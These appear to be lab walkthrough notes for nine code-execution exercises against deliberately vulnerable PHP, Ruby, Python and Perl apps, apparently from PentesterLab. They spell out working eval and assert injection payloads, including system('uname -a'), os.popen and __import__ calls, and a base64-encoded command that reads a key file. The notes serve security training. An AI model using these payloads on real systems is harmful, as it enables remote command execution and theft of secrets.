# Essential : Code Execution 01

* In this section, we are going to work on `code execution`. Code executions come from a lack of filtering and/or escaping of `user-controlled data`. 

* When you are exploiting a code injection, you will need to `inject code` as part of the data you are sending to the application. 

* For example, if you want to run the command `ls`, you will need to send `system("ls")` to the application if it is a `PHP` application.

* Just like other examples of web application issues, it's always handy to know how to `comment out` the rest of the code (i.e.: the suffix that the application will add to the user-controlled data). In `PHP`, you can use `//` to get rid of the code added by the application.

* As with `SQL` injection, you can use the same value technique to test and ensure you have a code injection:

	* By using comments and injecting `/* random value */.`

* By injecting a simple concatenation `"."` (where `"` are used to break the syntax and reform it correctly).

* By replacing the parameter you provided by a string concatenation, for example `"."ha"."cker"."` instead of `hacker`.

* You can also use `time-based detection` for this issue by using the `PHP` function `sleep`. You will see a time difference between:

	* Not using the function `sleep` or calling it with a delay of zero: `sleep(0)`.

	* A call to the function with a long delay: `sleep(10)`.

	* Obviously, the code injection should be in the language used by the application. 

	* Therefore, the first step in an injection is to `find what language` is used by the application. 

	* To do so you can look at the `response's headers`, `generate errors` or look at the `way special characters are handle` by the application (for example by comparing `+` and `.` for concatenation of strings.

* This example is a trivial `code injection`. If you inject a `single quote`, nothing happens. However, you can get a better idea of the problem by injecting a `double quote`:

	* `Parse error: syntax error, unexpected '!', expecting ',' or ';' in /var/www/index.php(6) : eval()'d 
code on line 1`

	* This could be the other way around; the `single quote` could generate an error where the `double quote` may not.

* Based on the error message, we can see that the code is using the function `eval`: `Eval is evil...`.

* We saw that the `double quote` breaks the syntax, and that the function `eval` seems to be using our input. From this, we can try to work out payloads that will give us the same results:

	* `"."`: we are just adding a `string concatenation`; this should give us the same value.

	* `"./*pentesterlab*/"`: we are just adding a `string concatenation` and information inside `comments`; this should give us the same value.

* Now that we have similar values working, we need to inject code. To show that we can execute code, we can try to run a command (for example `uname -a` using the code execution). The full `PHP` code looks like:

	* `system('uname -a');`

* The challenge here is to break out of the code syntax and keep a clean syntax. There are many ways to do it:

	* By adding dummy code: `".system('uname -a'); $dummy="`.

	* By using `comment`: `".system('uname -a');#` or `".system('uname -a');//`.

	* Don't forget that you will need to `URL-encode` some of the characters (`#` and `;`) before sending the request.

	* You can access this exercise using the following URL: [http://ptl-9d51e540-0040dd22.libcurl.so/](http://ptl-9d51e540-0040dd22.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-9d51e540-0040dd22.libcurl.so/](https://ptl-9d51e540-0040dd22.libcurl.so/).

	* using `burp` change the payload and url encode the payload or you can simply change it in browser url itself.

	* `GET /?name=".system('uname+-a')%3b%23 HTTP/1.1`

# Essential : Code Execution 02

* When ordering information, developers can use two methods:

	* `order by` in a `SQL` request;
	
	* `usort` in `PHP` code.

* The function `usort` is often used with the function `create_function` to `dynamically generate the sorting function`, based on `user-controlled` information. If the web application lacks potent filtering and validation, this can lead to `code execution`.

* By injecting a `single quote`, we can get an idea of what is going on:
```
Parse error: syntax error, unexpected '',$b->id'' (T_CONSTANT_ENCAPSED_STRING) in /var/www/index.php(29) : 
runtime-created function on line 1

Warning: usort() expects parameter 2 to be a valid callback, no array or string given in /var/www/index.php
 on line 29
```

* The source code of the function looks like the following:
```
ZEND_FUNCTION(create_function)
{
  [...]
  eval_code = (char *) emalloc(eval_code_length);
  sprintf(eval_code, "function " LAMBDA_TEMP_FUNCNAME "(%s){%s}", Z_STRVAL_PP(z_function_args), Z_STRVAL_PP(z_function_code));

  eval_name = zend_make_compiled_string_description("runtime-created function" TSRMLS_CC);
  retval = zend_eval_string(eval_code, NULL, eval_name TSRMLS_CC);
  [...]
 ```

* We can see that the code that will be evaluated is put inside curly brackets `{...}`, and we will need this information to correctly finish the syntax, after our injection.

* As opposed to the previous code injection, here, you are not injecting inside single or double quotes. We know that we need to close the statement with `}` and comment out the rest of the code using `//` or `#` (with encoding). We can try poking around with:

	* `?order=id;}//`: we get an error message (`Parse error: syntax error, unexpected ';')`. We are probably missing one or more brackets.

	* `?order=id);}//`: we get a warning. That seems about right.

	* `?order=id));}//`: we get an error message (`Parse error: syntax error, unexpected ')' i)`. We probably have too many closing brackets.

* Since we now know how to finish the code correctly (a warning does not stop the execution flow), we can inject arbitrary code and gain code execution using `?order=id);}system('uname%20-a');//` for example.

* You can access this exercise using the following URL: [http://ptl-fe4308c2-1232a3b7.libcurl.so/](http://ptl-fe4308c2-1232a3b7.libcurl.so/).

* You can use the following payload

* `order=id,1);}system(%27uname%27);//` in order to avoid any warnings that we faced in above payload, because `strcmp` take two argument as `id` was used in it, out payload need to finish that code correctly.

# Essential : Code Execution 03

* We talked earlier about `regular expression modifiers` with `multi-line regular expression`. Another very dangerous modifier exists in `PHP`: `PCRE_REPLACE_EVAL` (`/e`). This modifier will cause the function `preg_replace` to evaluate the new value as `PHP` code, before performing the substitution.

* `PCRE_REPLACE_EVAL` has been deprecated as of `PHP 5.5.0`

* Here, you will need to change the pattern, by adding the `/e` modifier. Once you have added this modifier, you should get a notice:

	* `Notice: Use of undefined constant hacker - assumed 'hacker' in /var/www/codeexec/example3.php(3) : regexp code on line 1`

* The function `preg_replace` tries to evaluate the value `hacker` as a constant but it's not defined, and you get this message.

* You can easily replace `hacker` with a call to the function `phpinfo()` to get a visible result. Once you can see the result of the `phpinfo` function, you can use the function `system` to run any command.

* You can access this exercise using the following URL: [http://ptl-1ee478ec-b4d42344.libcurl.so/](http://ptl-1ee478ec-b4d42344.libcurl.so/).

* you can use `http://ptl-1ee478ec-b4d42344.libcurl.so/?new=phpinfo()&pattern=/lamer/e&base=Hello%20lamer` instead of `http://ptl-1ee478ec-b4d42344.libcurl.so/?new=hacker&pattern=/lamer/&base=Hello%20lamer` or with `http://ptl-1ee478ec-b4d42344.libcurl.so/?new=system(%27uname%20-a%27)&pattern=/lamer/e&base=Hello%20lamer`

# Essential : Code Execution 04

* This example is based on the function `assert`. When used incorrectly, this function will `evaluate` the value received. This behaviour can be used to gain `code execution`.

* By injecting a `single quote` or `double quote` (depending on the way the string was declared), we can see an error message indicating that `PHP` tried to evaluate the code:

* `Parse error: syntax error, unexpected T_ENCAPSED_AND_WHITESPACE in /var/www/codeexec/example4.php(4) : assert code on line 1 Catchable fatal error: assert(): Failure evaluating code: 'hacker'' in /var/www/codeexec/example4.php on line 4`

* Once we broke the syntax, we need to try to reconstruct it correctly. We can try the following:

* ` hacker'.'. ` The error message disappeared.

* Now that we know how to finish the syntax to avoid errors, we can just inject our payload to run the function `phpinfo()`: `hacker'.phpinfo().'` and we get the configuration of the PHP engine in the page.

* Finally, we can use `system` to score.

* You can access this exercise using the following URL: [http://ptl-2983cf07-c23b555f.libcurl.so/](http://ptl-2983cf07-c23b555f.libcurl.so/).

# Essential : Code Execution 05

* In this exercise, we are dealing with a `Ruby` application as you can quickly tell by injecting a `double quote` in the `username` parameter.

* Since the application is in `development mode`, we get a lot of details on the error. The following line is especially interesting:

* ` @message = eval "\"Hello "+params['username']+"\"" `
* We can see that we are injecting in a call to `eval`.

* Always remember: `eval is evil`.

* Here, we will need to do the following:

	* a double-quote `"` to break out of the string. 

	* add a `+` sign for string concatenation (don't forget to url-encode it) 

	* add a call to the `command` (`[command]`) we want to run using ``` `[command]` ```.

	* Add another `+` sign for string concatenation.

	* Another double-quote `"` to close the one that was already there.

* Once we put everything together, we should be able to run the score command.

* You can access this exercise using the following URL: [http://ptl-a8bd51cc-64e24f50.libcurl.so/](http://ptl-a8bd51cc-64e24f50.libcurl.so/).

# Essential : Code Execution 06

* In this exercise, we are dealing with a `Python` application. Like with the previous exercise, we can see that injecting a `double-quote` give us an error.

* First, let's see how we can properly close the `double-quote`. We can inject a `+` (properly encoded) and another `double-quote` to get a response without error.

* Now, we need to make sure it's a `Python` application, we can for example use:

* ` "%2bstr(True)%2b"test`. The fact that both `str()` and `True` are available give us a pretty good chance that `Python` is used. For the rest of the challenge we will put our payload inside of the call to `str()`.

* Now, we want to get to code execution. We can try to use `os.system('id')` for example.

* We can see a `0` coming back in the response. This shows that the command got executed successfully. If you try an invalid command like `hacker`, you will get `32512` meaning that the process returned `127` (since the command is not found).

* It may also be valuable to get the value returned by the command. To do this, you can use: 

* `os.popen('[CMD]').read()` instead of `os.system('[CMD]')`.

* Finally, by changing the call to `id` to the `/usr/local/bin/score UUID` command, you should be able to score this exercise.

* You can access this exercise using the following URL: [http://ptl-8a5d7146-208ae1e3.libcurl.so/](http://ptl-8a5d7146-208ae1e3.libcurl.so/).

* `http://ptl-8a5d7146-208ae1e3.libcurl.so/hello/hacker%22+str(os.popen('uname%20-a').read())+%22`

# Essential : Code Execution 07

* In the previous challenge, we made things a bit easier by importing `os` in the vulnerable application. However, we didn't for this challenge.

* If we try to use `os.system('id')` for example. we get an error message. This is likely due to the fact that the `os module` (that we need to access `system`) is not loaded. We can use the following syntax to `load` and run the `system` function: `__import__('os').system(....`

* Finally, by changing the call to id to the score command, you should be able to score this exercise.

* You can access this exercise using the following URL: [http://ptl-5805e66b-185ec5ce.libcurl.so/](http://ptl-5805e66b-185ec5ce.libcurl.so/).

* `http://ptl-5805e66b-185ec5ce.libcurl.so/hello/hacker%22+str(__import__('os').popen(%22uname%20-a%22).read())+%22`

# Essential : Code Execution 08

* This challenge is very similar to the previous challenge. The previous challenge allowed `/` in the path since the following `Flask route` was used:

* `@app.route('/hello/')`

* This challenge prevents `/` in the path since the following `route` is used:

* `@app.route('/hello/user')`

* This is obviously something you can only guess by trial and error. We can go back to the previous payload using `id` and it will work. However, we can't access the content of `/pentesterlab.key` (since we need a `/`).

* To bypass this issue, we can use `base64 encoding`. We will send a base64 encoded command to the server (to avoid the `/` in the path) and tell the server to `decode` it using the function `b64decode`. The call to `b64decode` will be done by the server as part of our `payload`. Unfortunately the `base64 module` is not loaded, so we will need to use the `__import__` trick to load `base64`. Finally, the command to score will need to be `base64-encoded` before being sent to the server (so the payload can decode it).

* where `Y2F0IC4uL3BlbnRlc3RlcmxhYi5rZXk=` is `base64` encoded string of `cat ../pentesterlab.key`

# Essential : Code Execution 09

* This challenge is code injection in `Perl`. The `Perl script` is deployed as a `CGI script`. You can quickly get a better understanding of how the site works by inspecting the traffic. First the index page is loaded, then it does a request to the `CGI` in `JavaScript`.

* As always, you can use `single or double quotes` to trigger unexpected behaviour in the application.

* Once you find which one is used, you should be able to gain command execution using `backticks` or one of the `Perl` functions used to run command (`system`, `exec`...). Once you are able to run commands like `uname`, you should be able to score this exercise.

* You can access this exercise using the following URL: [http://ptl-5449c3e0-26c79fef.libcurl.so/](http://ptl-5449c3e0-26c79fef.libcurl.so/).
